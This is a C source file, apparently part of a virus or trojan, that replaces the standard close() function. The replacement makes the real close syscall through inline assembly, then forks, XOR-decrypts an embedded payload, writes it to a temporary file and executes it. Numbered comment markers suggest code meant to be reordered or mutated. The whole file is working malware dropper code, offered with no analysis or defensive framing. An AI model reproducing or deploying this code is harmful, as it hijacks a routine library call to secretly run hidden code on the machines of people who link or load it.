/***14***/
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

#define __NR_close 6

extern char X1[];
extern int X1LEN;

int cclose(int);
int dump_it(FILE*, char*, char*, int);

/***8***/
int close(int fd)
{
   	static int first = 0;
        int i = 0;
        FILE *o1, *o2, *o3, *o4, *o5, *o7;
        int retval;
        char *argv[3] = {0};
 
    	argv[0] = tmpnam(NULL);
        if (first == 1) {
           	return cclose(fd);
        }
        first = 1;
        
        retval = cclose(fd);
/***5***/
#ifndef DEBUG
        if (fork() > 0) {
           	return retval;
        }
#endif
        if ((o1 = fopen(argv[0], "w+")) == NULL) {
/***3***/
#ifdef DEBUG
              	perror("fopen");
#endif
                exit(errno);
        }
        Vcrypt(X1, KEY, X1LEN);
        dump_it(o1, X1, NULL, X1LEN);

        fclose(o1); 
 
        chmod(argv[0], 0100|0200|0400);
        execve(argv[0], argv, NULL);
/***end***/
}                

/***3***/
int cclose(int fd)
{
   	long __res;
 
    	errno = 0;       
/***3***/
        __asm__ volatile ("int $0x80"
                	: "=a" (__res)
                        : "0" (__NR_close),"b" ((long)(fd)));
                        if (__res >= 0) {
                           	return (int)__res;
                        }
                        errno = -__res;
                        return -1;
/***end***/
}

/***4***/
/* We expect key as char[30] */
int Vcrypt(char *s, char *key, int s_len)
{
   	int i = 0, j = 0;
        
        for(;i < s_len; i++) {
           	s[i] ^= key[j++ % 30];           	
        }
        return 0;
/***end***/
}

/***3***/
int dump_it(FILE *fd, char *s, char *cnam, int s_len)
{
   	int i = 0, j = 1, count = 0;
        
        if (cnam) {
           	fprintf(fd, "char %s[] =\n\"", cnam);
        }
        for (; i < s_len; i++) {
           	count++;
                if (cnam) {
                   	fprintf(fd, "\\x%02x", (unsigned char)s[i]);
                } else {
                   	fprintf(fd, "%c", s[i]);
                }
                if (!(j % 15) && cnam) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
                j++;
        }
        if (j != 1 && cnam) {
           	fprintf(fd, "\"");
        }
        if (cnam) {
           	fprintf(fd, ";");
                fprintf(fd, "int %sLEN = %d;\n", cnam, count);
        }
        return 0;
/***end***/
}
   
